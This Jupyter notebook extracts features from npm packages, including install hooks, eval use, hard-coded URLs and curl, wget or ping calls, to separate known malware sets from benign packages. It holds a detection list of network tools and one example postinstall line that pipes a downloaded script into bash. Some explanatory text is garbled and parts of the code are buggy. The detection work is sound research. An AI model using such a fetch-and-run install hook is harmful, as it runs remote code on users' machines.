{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "00002ef9",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import tarfile\n",
    "import json\n",
    "import re\n",
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "21bc7608-9076-44f5-9a66-7f61c6cf1cf7",
   "metadata": {},
   "source": [
    "### Function: `strip_comments`\r\n",
    "This function remove both single-line and multi-line comments from a given string, such as source code or text files. It uses regular expressions to find and remove comments while keeping the rest of the content intact.d.\r\n",
    "\r\n",
    "#### Parameters:\r\n",
    "- **contents** (`str`): The input string, which can be code or text that might contain comments.\r\n",
    "\r\n",
    "#### How It Works:\r\n",
    "1. **Single-line comments**:\r\n",
    "   - These are the comments that start with `//` and continue to the end of the line.\r\n",
    "   - The function identifies them using the pattern `//.*\\n`, which looks for everything after `//` until the end of the line.\r\n",
    "   - Once identified, these comments are replaced with a simple nthene, so your line breaks stay intact.\r\n",
    "\r\n",
    "2. **Multi-line comments**:\r\n",
    "   - These comments are the ones wrapped in `/*` and `*/`, and they can span multiple lines.\r\n",
    "   - The function uses `/\\*.*?\\*/` with some extra handling (thanks to `re.DOTALL`) to capture comments even if they stretch across several lines.\r\n",
    "   - After identifying them, it simply removes them from the string, leaving the rest of your content clean aer single-line comment\r\n",
    "'''\r\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cacb86bb",
   "metadata": {},
   "outputs": [],
   "source": [
    "def strip_comments(contents):\n",
    "\n",
    "    # Regular expression pattern to match single-line comments\n",
    "    single_line_pattern = re.compile(r'//.*\\n')\n",
    "    contents = re.sub(single_line_pattern, '\\n', contents)\n",
    "\n",
    "    # Regular expression pattern to match multi-line comments\n",
    "    multi_line_pattern = re.compile(r'/\\*.*?\\*/', re.DOTALL)\n",
    "    contents = re.sub(multi_line_pattern, '', contents)\n",
    "\n",
    "    return contents"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2bfdd55f-bd52-49f9-93e7-789f046fcf4b",
   "metadata": {},
   "source": [
    "### Function: `get_directories`\r\n",
    "\r\n",
    "This function helps you retrieve all the directories inside a specified folder. It’s useful when you want to filter out files and just focus on the subdirectories within a given directory.\r\n",
    "\r\n",
    "#### Parameters:\r\n",
    "- **directory** (`str`): The path to the directory where you want to search for subdirectories.\r\n",
    "\r\n",
    "#### How It Works:\r\n",
    "1. **List all items**: The function starts by listing everything inside the specified directory (both files and folders).\r\n",
    "2. **Filter directories**: It then filters this list to keep only the directories, ignoring any files or other items.\r\n",
    "3. **Return**: Finally, it returns a list containing the names of all subdi\n",
    "\n",
    "This is primarily used to iterate over each npm package in the folderlder1', 'folder2']th` contains:\r\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2fb04e8c",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_directories(directory):\n",
    "\n",
    "    # Get a list of all items in the directory\n",
    "    items = os.listdir(directory)\n",
    "\n",
    "    # Filter the list to only include directories\n",
    "    directories = [item for item in items if os.path.isdir(os.path.join(directory, item))]\n",
    "    return directories"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "31f26994-d207-4696-97c9-fb47dce39d4a",
   "metadata": {},
   "source": [
    "### Function: `check_post_install`\n",
    "\n",
    "This function checks whether a specific `package.json` file inside a given folder contains any `preinstall`, `postinstall`, or `install` scripts. It's a helpful way to see if a package might run something during installation, which could be important when assessing package behavior.\n",
    "\n",
    "#### Parameters:\n",
    "- **folder** (`str`): The folder where you want to search for a `package.json` file.\n",
    "\n",
    "#### How It Works:\n",
    "1. **Search for `package.json`**: The function walks through all the directories and files inside the specified folder, looking for a `package.json` file.\n",
    "2. **Read and parse `package.json`**: Once the `package.json` file is found, it tries to read and parse its contents as JSON.\n",
    "3. **Check for scripts**: It checks if the `scripts` section of `package.json` contains any of the following:\n",
    "   - `preinstall`\n",
    "   - `postinstall`\n",
    "   - `install`\n",
    "4. **Return result**: If any of these scripts are present, the function returns `True`, indicating that one of these scripts exists. If no such scripts are found, or if there's an error, it returns `False`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "707bf5b1",
   "metadata": {},
   "outputs": [],
   "source": [
    "def check_post_install(folder):\n",
    "    \n",
    "    # Construct the path to the package.json file\n",
    "    for root, dirs, files in os.walk(folder):\n",
    "        for file in files:\n",
    "            if file == \"package.json\":\n",
    "                file_path = os.path.join(root, file)\n",
    "                # Read the contents of the package.json file\n",
    "                try:\n",
    "                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:\n",
    "                        contents = json.load(file)\n",
    "                    # Check if the package.json file includes a \"scripts\" section\n",
    "                    if \"scripts\" in contents:\n",
    "                        scripts = contents[\"scripts\"]\n",
    "\n",
    "                        # Check if the package.json file includes a pre, post, or install script\n",
    "                        if \"preinstall\" in scripts or \"postinstall\" in scripts or \"install\" in scripts:\n",
    "                            return True\n",
    "                except Exception as e:\n",
    "                    print(f\"{file_path} - {e}\")\n",
    "    return False"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5da5df02-d71f-46c0-8d02-8e1c28b1f91e",
   "metadata": {},
   "source": [
    "### Function: `check_modules_used`\n",
    "\n",
    "This function scans JavaScript files within a specified folder to find and list the modules that are being imported or required. It helps identify the external dependencies that a project or file uses.\n",
    "\n",
    "#### Parameters:\n",
    "- **folder** (`str`): The path to the folder where you want to search for JavaScript files.\n",
    "\n",
    "#### How It Works:\n",
    "1. **Initialize the module tracker**: The function starts by creating an empty set called `modules_used` to keep track of the modules it finds.\n",
    "   \n",
    "2. **Loop through all files**: It recursively walks through the folder, examining all files. If a file ends with `.js`, it’s considered a JavaScript file, and its contents are processed.\n",
    "   \n",
    "3. **Remove comments**: Before analyzing the file's contents, it strips out comments using the `strip_comments` function to avoid parsing modules mentioned in comments.\n",
    "   \n",
    "4. **Identify modules**: It looks for two types of imports:\n",
    "   - **CommonJS imports**: These are found using `require()` calls, typical in Node.js.\n",
    "   - **ECMAScript module imports**: These are found using the `import` keyword.\n",
    "   \n",
    "   Both patterns are captured using regular expressions, and any modules found are added to the `modules_used` set.\n",
    "   \n",
    "5. **Return the result**: After scanning all the files, the function returns a set of all the unique modules that were imported across all JavaScript files in the folder.\n",
    "\n",
    "#### Example:\n",
    "\n",
    "Suppose the folder contains a JavaScript file like this:\n",
    "\n",
    "```javascript\n",
    "// A sample JavaScript file\n",
    "const fs = require('fs');\n",
    "import axios from 'axios';\n",
    "```\n",
    "Running check_modules_used(\"/path/to/folder\") would return a set like this:\n",
    "\n",
    "```python\n",
    "{'fs', 'axios'}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c7904183",
   "metadata": {},
   "outputs": [],
   "source": [
    "def check_modules_used(folder):\n",
    "    # Keep track of the modules used in each file\n",
    "    modules_used = set()\n",
    "    # Loop through each file in the folder\n",
    "    for root, dirs, files in os.walk(folder):\n",
    "        for file in files:\n",
    "            if file.endswith(\".js\"):\n",
    "                file_path = os.path.join(root, file)\n",
    "                with open(file_path, \"r\", encoding='utf-8', errors='ignore') as file:\n",
    "                    contents = file.read()\n",
    "                    contents = strip_comments(contents)\n",
    "                    \n",
    "                    import_common = re.compile(r\"require\\(['|\\\"](.*?)['|\\\"]\\)\")\n",
    "                    import_ecma = re.compile(\"import [a-zA-Z0-9_]+ from ['\\\"][a-zA-Z0-9_./]+['\\\"]\")\n",
    "                    common = import_common.findall(contents)\n",
    "                    ecma = import_ecma.findall(contents)\n",
    "                    common = set(common)\n",
    "                    ecma = set(common)\n",
    "                    modules_used = modules_used.union(ecma)\n",
    "                    modules_used = modules_used.union(common)\n",
    "\n",
    "    return modules_used"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "81b47127-7b8d-4248-9193-a7da979ee62c",
   "metadata": {},
   "source": [
    "### Function: `check_eval_usage`\n",
    "\n",
    "This function scans all JavaScript files within a specified folder to check if any of them use the potentially unsafe `eval()` function. The `eval()` function can execute arbitrary code.\n",
    "\n",
    "#### Parameters:\n",
    "- **folder** (`str`): The path to the folder where you want to search for JavaScript files.\n",
    "\n",
    "#### How It Works:\n",
    "1. **Search through all files**: The function walks through the folder and all its subdirectories, examining each file.\n",
    "   \n",
    "2. **Target JavaScript files**: It only checks files with the `.js` extension, which are JavaScript files.\n",
    "\n",
    "3. **Remove comments**: Before analyzing the content, it uses the `strip_comments` function to remove comments, ensuring that `eval()` mentioned in comments is ignored.\n",
    "\n",
    "4. **Check for `eval()`**: The function searches for any occurrence of the `eval(` keyword in the file content. If it finds it, it immediately returns `True`, indicating that `eval()` is used in that file.\n",
    "\n",
    "5. **Return result**: If none of the files contain `eval()`, the function returns `False`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3a0c161d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def check_eval_usage(folder):\n",
    "    for root, dirs, files in os.walk(folder):\n",
    "        eval_found = False\n",
    "        for file in files:\n",
    "            if file.endswith(\".js\"):\n",
    "                file_path = os.path.join(root, file)\n",
    "                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:\n",
    "                    contents = f.read()\n",
    "                    contents = strip_comments(contents)\n",
    "                    if \"eval(\" in contents:\n",
    "                        return True\n",
    "    return False"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2cda7fa0-7c61-4a09-ab02-24d04f84743c",
   "metadata": {},
   "source": [
    "### Function: `search_url_and_ip_address`\n",
    "\n",
    "This function scans JavaScript files in a given directory to detect any URLs or IP addresses. It uses regular expressions to identify patterns that match URLs and IPv4 addresses.\n",
    "\n",
    "#### Parameters:\n",
    "- **directory** (`str`): The path to the directory where you want to search for JavaScript files.\n",
    "\n",
    "#### How It Works:\n",
    "1. **Define the search pattern**: The function uses a regular expression to match both:\n",
    "   - **URLs** (e.g., `http://example.com`, `https://site.com`, `ftp://fileserver.com`)\n",
    "   - **IP addresses** in IPv4 format (e.g., `192.168.0.1`).\n",
    "   \n",
    "2. **Search through JavaScript files**: It walks through the specified directory and all its subdirectories, looking for `.js` files.\n",
    "\n",
    "3. **Read and search the files**: For each JavaScript file, it reads the contents and searches for URLs or IP addresses using the defined pattern.\n",
    "\n",
    "4. **Return result**: If any URLs or IP addresses are found in the file, the function returns `True`. If no such patterns are found, it returns `False`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "09f1802f",
   "metadata": {},
   "outputs": [],
   "source": [
    "def search_url_and_ip_address(directory):\n",
    "    # Create a regular expression pattern to match URLs and IP addresses\n",
    "    pattern = re.compile(r'\\b(?:(?:https?|ftp):\\/\\/[^\\s/$.?#].[^\\s]*)|(?:(?:\\d{1,3}\\.){3}\\d{1,3}\\b)')\n",
    "\n",
    "    # Walk through the directory and search for JavaScript files\n",
    "    for root, dirs, files in os.walk(directory):\n",
    "        for file in files:\n",
    "            if file.endswith(\".js\"):\n",
    "                file_path = os.path.join(root, file)\n",
    "                with open(file_path, \"r\", encoding='utf-8', errors='ignore') as f:\n",
    "                    contents = f.read()\n",
    "\n",
    "                    # Search for URLs and IP addresses in the file contents\n",
    "                    findings = re.findall(pattern, contents)\n",
    "\n",
    "                    # Print the results\n",
    "                    if findings:\n",
    "                        return True"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5bdee8d2-1e3b-4200-833c-ddf7e04ceed1",
   "metadata": {},
   "source": [
    "### Function: `find_files`\n",
    "\n",
    "This function scans through a directory to find any files that match a specific set of extensions, such as shell scripts (`.sh`, `.bash`, `.bat`, `.zsh`).\n",
    "\n",
    "#### Parameters:\n",
    "- **directory** (`str`): The path to the directory where you want to search for files.\n",
    "\n",
    "#### How It Works:\n",
    "1. **Define target extensions**: The function is set up to look for files with the following extensions:\n",
    "   - `.sh` (Shell scripts)\n",
    "   - `.bash` (Bash scripts)\n",
    "   - `.bat` (Batch files for Windows)\n",
    "   - `.zsh` (Zsh scripts)\n",
    "   \n",
    "2. **Walk through the directory**: The function walks through the specified directory and all its subdirectories, checking each file it encounters.\n",
    "\n",
    "3. **Match extensions**: For each file, it checks if the filename ends with any of the extensions defined in the list. If a match is found, the function returns `True`, indicating that at least one matching file exists.\n",
    "\n",
    "4. **Return result**: If no files with the target extensions are found, the function returns `False`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf94afa7",
   "metadata": {},
   "outputs": [],
   "source": [
    "def find_files(directory):\n",
    "    extensions = [\".sh\", \".bash\", \".bat\", \".zsh\"]\n",
    "    for root, dirs, files in os.walk(directory):\n",
    "        for file in files:\n",
    "            for extension in extensions:\n",
    "                if file.endswith(extension):\n",
    "                    return True\n",
    "    return False"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "35cae8fb-0945-4ccd-94fb-57903ae69b71",
   "metadata": {},
   "source": [
    "### Function: `check_curl_used`\n",
    "\n",
    "This function checks if any `package.json` files in a directory contain a reference to the commands `curl`, `wget`, or `ping` in their scripts.\n",
    "#### Parameters:\n",
    "- **directory** (`str`): The path to the directory where you want to search for `package.json` files.\n",
    "\n",
    "#### How It Works:\n",
    "1. **Search for `package.json` files**: The function walks through the specified directory and its subdirectories, looking for any `package.json` files.\n",
    "   \n",
    "2. **Read and parse `package.json`**: Once a `package.json` file is found, it attempts to read and parse the file's contents as JSON.\n",
    "\n",
    "3. **Check for scripts**: It looks for a `scripts` section in the `package.json` file, which may include various lifecycle hooks like `preinstall`, `postinstall`, or `install`.\n",
    "\n",
    "4. **Search for specific commands**: The function then checks if any of these lifecycle scripts use the following network-related commands:\n",
    "   - `curl`\n",
    "   - `wget`\n",
    "   - `ping`\n",
    "\n",
    "5. **Return result**: If any of these commands are found in the script section, the function returns `True`. If no such scripts or commands are found, it returns `False`. If an error occurs while reading the `package.json` file, it logs the error and moves on to the next file.\n",
    "\n",
    "#### Example:\n",
    "\n",
    "Consider the following `package.json`:\n",
    "\n",
    "```json\n",
    "{\n",
    "  \"name\": \"example-package\",\n",
    "  \"version\": \"1.0.0\",\n",
    "  \"scripts\": {\n",
    "    \"postinstall\": \"curl http://example.com/setup.sh | bash\"\n",
    "  }\n",
    "}\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba57e8a8-83a9-44c4-81c6-dc7aaad84c65",
   "metadata": {},
   "outputs": [],
   "source": [
    "def check_curl_used(directory):\n",
    "    for root, dirs, files in os.walk(directory):\n",
    "        for file in files:\n",
    "            if file == \"package.json\":\n",
    "                file_path = os.path.join(root, file)\n",
    "                # Read the contents of the package.json file\n",
    "                try:\n",
    "                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:\n",
    "                        contents = json.load(f)\n",
    "                    # Check if the package.json file includes a \"scripts\" section\n",
    "                    if \"scripts\" in contents:\n",
    "                        scripts = contents[\"scripts\"]\n",
    "                        for script_type in [\"preinstall\", \"postinstall\", \"install\"]:\n",
    "                            if script_type in scripts:\n",
    "                                for type in [\"curl\", \"wget\", \"ping\"]:\n",
    "                                    if type in scripts[script_type]:\n",
    "                                        return True\n",
    "                except (json.JSONDecodeError, FileNotFoundError, IOError) as e:\n",
    "                    print(f\"Error reading {file_path}: {e}\")\n",
    "                    continue\n",
    "    return False"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d7949d49-5317-4a31-adc4-73c8bb592be4",
   "metadata": {},
   "source": [
    "### Function: `extract_features`\n",
    "\n",
    "This function analyzes a directory of packages and extracts various features defined in the paper. It consolidates information such as module usage, the presence of certain scripts, and the use of external resources into a CSV file.\n",
    "\n",
    "#### Parameters:\n",
    "- **file_path** (`str`): The path to the directory containing the packages you want to analyze.\n",
    "- **output** (`str`): The path where the results (in CSV format) should be saved.\n",
    "\n",
    "#### How It Works:\n",
    "1. **Get the list of directories**: The function first gathers a list of directories (representing packages) from the provided `file_path`. It skips unnecessary directories like `.ipynb_checkpoints`.\n",
    "\n",
    "2. **Feature extraction for each package**: For each package, the function performs a series of checks:\n",
    "   - **Scripts**: It checks if the package includes installation scripts such as `preinstall`, `postinstall`, or `install` by using the `check_post_install()` function.\n",
    "   - **Modules used**: It identifies the modules used in the package’s JavaScript files via `check_modules_used()`.\n",
    "   - **`eval()` usage**: It determines whether the `eval()` function is used using `check_eval_usage()`.\n",
    "   - **URLs and IP addresses**: It searches for hardcoded URLs and IP addresses within the package using `search_url_and_ip_address()`.\n",
    "   - **Bash files**: It checks if the package includes any shell or batch script files via `find_files()`.\n",
    "   - **Network-related commands**: It checks for the presence of commands like `curl`, `wget`, or `ping` in the package’s lifecycle scripts using `check_curl_used()`.\n",
    "\n",
    "3. **Track specific modules**: The function also tracks the usage of specific Node.js modules that may indicate external interaction or privilege usage, such as:\n",
    "   - `fs`, `node-fetch`, `child_process`, `https`, `http`, `crypto`, `os`, `node-serialize`, `axios`, `querystring`, `dns`, `path`.\n",
    "\n",
    "   It adds a boolean value for each module, indicating whether or not it is used by the package.\n",
    "\n",
    "4. **Create and save the dataframe**:\n",
    "   - The data is stored in a Pandas DataFrame, where each row corresponds to a package and each column represents a feature.\n",
    "   - A combined column, `https_or_http`, is created to indicate if either the `https` or `http` module is used.\n",
    "   - The resulting feature set is saved as a CSV file in the specified output directory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15eff090",
   "metadata": {},
   "outputs": [],
   "source": [
    "def extract_features(file_path, output):\n",
    "    target_package_datas = {}\n",
    "    directories = get_directories(file_path)\n",
    "    for package in directories:\n",
    "        if package != \".ipynb_checkpoints\":\n",
    "            target_package_datas[package] = {\"package_name\": package}\n",
    "            \n",
    "    for directory in directories:\n",
    "        if directory != \".ipynb_checkpoints\":\n",
    "            package_path = os.path.join(file_path, directory)\n",
    "            package_path = os.path.join(package_path, 'package/')\n",
    "            target_package_datas[directory][\"entry_through_script\"] = check_post_install(package_path)\n",
    "            target_package_datas[directory][\"modules_used\"] = check_modules_used(package_path)\n",
    "            target_package_datas[directory][\"eval\"] = check_eval_usage(package_path)\n",
    "            target_package_datas[directory][\"has_ip_or_address\"] = search_url_and_ip_address(package_path)\n",
    "            target_package_datas[directory][\"has_bash_file\"] = find_files(package_path)\n",
    "            target_package_datas[directory][\"curl\"] = check_curl_used(package_path)\n",
    "                \n",
    "                \n",
    "    # Extract libraries            \n",
    "    tracked_modules = [\"fs\", \"node-fetch\", \"child_process\", \"https\", \"http\", \"crypto\", \"os\", \n",
    "                   \"node-serialize\", \"axios\", \"querystring\", \"dns\", \"path\"]\n",
    "    \n",
    "    for package in target_package_datas:\n",
    "        modules = target_package_datas[package][\"modules_used\"]\n",
    "        for tracked_module in tracked_modules:\n",
    "            if tracked_module in modules:\n",
    "                target_package_datas[package][tracked_module] = True\n",
    "            else:\n",
    "                target_package_datas[package][tracked_module] = False\n",
    "                \n",
    "    dataframe = pd.DataFrame(target_package_datas.values())\n",
    "    dataframe = dataframe.fillna(False)\n",
    "    \n",
    "    dataframe[\"https_or_http\"] = dataframe[\"https\"] | dataframe[\"http\"]\n",
    "    dataframe.drop(\"https\", inplace=True, axis=1)\n",
    "    dataframe.drop(\"http\", inplace=True, axis=1)\n",
    "    \n",
    "    dataframe.to_csv(output + \"/feature.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d56f603",
   "metadata": {},
   "source": [
    "### Extract Backstabbers Features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ffc0e3ef",
   "metadata": {},
   "outputs": [],
   "source": [
    "source_folder_path = \"./Packages/Malware Backstabbers/npm_extracted\"\n",
    "result_destination = \"./Packages/Malware Backstabbers\"\n",
    "extract_features(source_folder_path, result_destination)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e84b4061",
   "metadata": {},
   "source": [
    "### Extract MalOSS Features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d233c2fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "source_folder_path = \"./Packages/Malware MalOSS/npmjs-samples_extracted\"\n",
    "result_destination = \"./Packages/Malware MalOSS\"\n",
    "extract_features(source_folder_path, result_destination)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "003ca86b",
   "metadata": {},
   "source": [
    "### Extract Collected Own"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bc78421",
   "metadata": {},
   "outputs": [],
   "source": [
    "source_folder_path = \"./Packages/Malware Own/npm_extracted2\"\n",
    "result_destination = \"./Packages/Malware Own\"\n",
    "extract_features(source_folder_path, result_destination)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd966c81",
   "metadata": {},
   "source": [
    "### Extract Benign Target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2927b4ad",
   "metadata": {},
   "outputs": [],
   "source": [
    "source_folder_path = \"./Packages/Benign Packages/Target Packages/packages_extracted\"\n",
    "result_destination = \"./Packages/Benign Packages/Target Packages\"\n",
    "extract_features(source_folder_path, result_destination)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "32a098c0",
   "metadata": {},
   "source": [
    "### Extract Benign Popular"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7b4b06e",
   "metadata": {},
   "outputs": [],
   "source": [
    "source_folder_path = \"./Packages/Benign Packages/Most Downloaded/packages_extracted\"\n",
    "result_destination = \"./Packages/Benign Packages/Most Downloaded\"\n",
    "extract_features(source_folder_path, result_destination)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
